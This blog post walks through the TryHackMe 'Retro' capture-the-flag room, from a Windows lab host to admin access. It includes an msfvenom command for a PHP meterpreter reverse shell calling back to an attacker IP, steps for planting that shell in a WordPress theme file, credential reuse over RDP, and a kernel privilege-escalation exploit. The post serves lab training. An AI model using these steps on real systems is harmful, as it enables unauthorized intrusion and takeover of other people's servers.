---
layout: post
author: dalemazza
title: THM - Retro Walkthrough
date: 2020-11-25
category: THM
tags: THM
published: true
---



## Retro

* Platform: **THM**
* Difficulty: **HARD**
* Flags: **3**

<p align="center">
  <img class="image" width="auto" height="auto" src="https://imgur.com/zKQqAdu.png">
</p>

This is a room on Try Hack Me. It is a full Pwn box meaning you have to go from unauthenticated to system privileges to finish the challenge, gaining 3 flags along the way.

This challenge includes the following techniques:  
* nmap
* ffuf
* Reverse-php-shells
* Windows exploit suggester
* MSF

## Quick overview

tested

As always I will start with a `nmap` scan, Unless this is different as the challenge states that it does not respond to ping. Due to this we can use the `-Pn` flag with nmap, this skips the host discovery as nmap by default pings the host before it scans.
```
nmap -Pn -sC -sV 10.10.165.48
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-24 16:00 EST
Nmap scan report for 10.10.165.48
Host is up (0.073s latency).
Not shown: 998 filtered ports
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info:
|   Target_Name: RETROWEB
|   NetBIOS_Domain_Name: RETROWEB
|   NetBIOS_Computer_Name: RETROWEB
|   DNS_Domain_Name: RetroWeb
|   DNS_Computer_Name: RetroWeb
|   Product_Version: 10.0.14393
|_  System_Time: 2020-11-24T21:00:23+00:00
| ssl-cert: Subject: commonName=RetroWeb
| Not valid before: 2020-11-23T20:43:36
|_Not valid after:  2021-05-25T20:43:36
|_ssl-date: 2020-11-24T21:00:24+00:00; 0s from scanner time.
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.69 seconds
```

Okay so we have a web server on **80** and RDP on **3389**, let's start with HTTP.

The website reveals nothing. Let's try some fuzzing to look for hidden directories.

```
/'___\  /'___\           /'___\       
/\ \__/ /\ \__/  __  __  /\ \__/       
\ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
\ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
 \ \_\   \ \_\  \ \____/  \ \_\       
  \/_/    \/_/   \/___/    \/_/       

v1.1.0
________________________________________________

:: Method           : GET
:: URL              : http://10.10.165.48/FUZZ
:: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
:: Follow redirects : false
:: Calibration      : false
:: Timeout          : 10
:: Threads          : 40
:: Matcher          : Response status: 200,204,301,302,307,401,403
________________________________________________

retro                   [Status: 301, Size: 149, Words: 9, Lines: 2]
[INFO] Adding a new job to the queue: http://10.10.165.48/retro/FUZZ
Retro                   [Status: 301, Size: 149, Words: 9, Lines: 2]
[INFO] Adding a new job to the queue: http://10.10.165.48/Retro/FUZZ
                [Status: 200, Size: 703, Words: 27, Lines: 32]
```

Got a few hits here

On the new found directory I started a new FUZZ and found some files relating to Wordpress.

```
wp-content              [Status: 301, Size: 160, Words: 9, Lines: 2]
[INFO] Adding a new job to the queue: http://10.10.165.48/Retro/wp-content/FUZZ
wp-includes             [Status: 301, Size: 161, Words: 9, Lines: 2]
[INFO] Adding a new job to the queue: http://10.10.165.48/Retro/wp-includes/FUZZ
wp-admin                [Status: 301, Size: 158, Words: 9, Lines: 2]
```
So this site is built with Wordpress. We can use `http://10.10.165.48/Retro/wp-login.php` to login. First we need to find some creds.

After browsing through the site I found this comment on the Ready Player 1 post.

<p align="center">
  <img class="image" width="auto" height="auto" src="https://imgur.com/cctKmx0.png">
</p>

This is the credentials for the Wordpress login.

After logging we have access to the theme editor, Using this we can gain a reverse shell.

Appearance > Theme editor > 404.php Let's use a php reverse shell on this page.

For this I used msfvenom to create a meterpreter reverse php shell.
```
msfvenom -p php/meterpreter/reverse_tcp LHOST=10.9.33.138 LPORT=1337 -f raw > shell.php
[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload
[-] No arch selected, selecting arch: php from the payload
No encoder specified, outputting raw payload
Payload size: 1112 bytes
```
Now paste this `shell.php` content into the `404.php` file on the wordpress site. Like so.

<p align="center">
  <img class="image" width="auto" height="auto" src="https://imgur.com/zYT0fsW.png">
</p>

Now to set up a MSF meterpreter listner!

```
msfconsole
use exploit/multi/handler
```
These are the settings I used. Take note of the payload being a php meterpreter reverse tcp.

<p align="center">
  <img class="image" width="auto" height="auto" src="https://imgur.com/aOGpZhc.png">
</p>

Now we have a meterpreter shell lets privesc!

So after playing around for a while the meterpreter shell I had kept flaking in on me and not allowing me to use any commands. I went back to the start and remembered the host has RDP on, I tried the same creds from the wordpress account....BOOM! RDP access. Really annoyed I didn't see this earlier!.

I used Remmina which is a RDP program for linux. After logging in I got the `user.txt` flag from the desktop. Now on the priv esc!

I opened a cmd prompt and used `systeminfo` copied this onto my attacking machine into a `.txt`. I used a program called Windows exploit suggester.

### What is windows exploit suggester?
This script uses the input from `systeminfo` and searches against a database to determine what exploits you can use by looking at the patches,hotfixes etc the system has installed.

Here is is. First you have to pull the latest database file.

```
./windows_exploit_suggester.py --update  #This pulls the latest database
./windows-exploit-suggester.py --database 2020-11-25-mssb.xls --systeminfo sysinfo.txt -l --ostext 'Windows 10 64-bit'
[*] initiating winsploit version 3.3...
[*] database file detected as xls or xlsx based on extension
[*] getting OS information from command line text
[*] attempting to read from the systeminfo input file
[+] systeminfo input file read successfully (ascii)
[*] querying database file for potential vulnerabilities
[*] comparing the 1 hotfix(es) against the 160 potential bulletins(s) with a database of 137 known exploits
[*] there are now 160 remaining vulns
[*] searching for local exploits only
[+] [E] exploitdb PoC, [M] Metasploit module, [*] missing bulletin
[+] windows version identified as 'Windows 10 64-bit'
[*]
[M] MS16-075: Security Update for Windows SMB Server (3164038) - Important
[*]   https://github.com/foxglovesec/RottenPotato
[*]   https://github.com/Kevin-Robertson/Tater
[*]   https://bugs.chromium.org/p/project-zero/issues/detail?id=222 -- Windows: Local WebDAV NTLM Reflection Elevation of Privilege
[*]   https://foxglovesecurity.com/2016/01/16/hot-potato/ -- Hot Potato - Windows Privilege Escalation
[*]
[E] MS16-032: Security Update for Secondary Logon to Address Elevation of Privile (3143141) - Important
[*]   https://www.exploit-db.com/exploits/40107/ -- MS16-032 Secondary Logon Handle Privilege Escalation, MSF
[*]   https://www.exploit-db.com/exploits/39574/ -- Microsoft Windows 8.1/10 - Secondary Logon Standard Handles Missing Sanitization Privilege Escalation (MS16-032), PoC
[*]   https://www.exploit-db.com/exploits/39719/ -- Microsoft Windows 7-10 & Server 2008-2012 (x32/x64) - Local Privilege Escalation (MS16-032) (PowerShell), PoC
[*]   https://www.exploit-db.com/exploits/39809/ -- Microsoft Windows 7-10 & Server 2008-2012 (x32/x64) - Local Privilege Escalation (MS16-032) (C#)
[*]
[M] MS16-016: Security Update for WebDAV to Address Elevation of Privilege (3136041) - Important
[*]   https://www.exploit-db.com/exploits/40085/ -- MS16-016 mrxdav.sys WebDav Local Privilege Escalation, MSF
[*]   https://www.exploit-db.com/exploits/39788/ -- Microsoft Windows 7 - WebDAV Privilege Escalation Exploit (MS16-016) (2), PoC
[*]   https://www.exploit-db.com/exploits/39432/ -- Microsoft Windows 7 SP1 x86 - WebDAV Privilege Escalation (MS16-016) (1), PoC
[*]
[E] MS15-102: Vulnerabilities in Windows Task Management Could Allow Elevation of Privilege (3089657) - Important
[*]   https://www.exploit-db.com/exploits/38202/ -- Windows CreateObjectTask SettingsSyncDiagnostics Privilege Escalation, PoC
[*]   https://www.exploit-db.com/exploits/38200/ -- Windows Task Scheduler DeleteExpiredTaskAfter File Deletion Privilege Escalation, PoC
[*]   https://www.exploit-db.com/exploits/38201/ -- Windows CreateObjectTask TileUserBroker Privilege Escalation, PoC
[*]
[*] done
```
Quite a few exploits available here. None of which I could get to work!

I went back to the drawing board and looked for kernal exploits against the verison of the OS.

I found this https://github.com/SecWiki/windows-kernel-exploits/tree/master/CVE-2017-0213 Lets see if it works!


Download the `x64` VERSION

Now serve it in a web Server

`sudo python3 http.server 80`

Now on the RDP version browse to `10.9.88.138` and download the CVE.exe you just downloaded.

<p align="center">
  <img class="image" width="auto" height="auto" src="https://imgur.com/FKg2TYS.png">
</p>

Now you have admin!

I found this box quite hard. I struggled to get a functional meterpreter shell aswell as working priv escs!. This server as a reminder to myself that kernel exploits are golden!
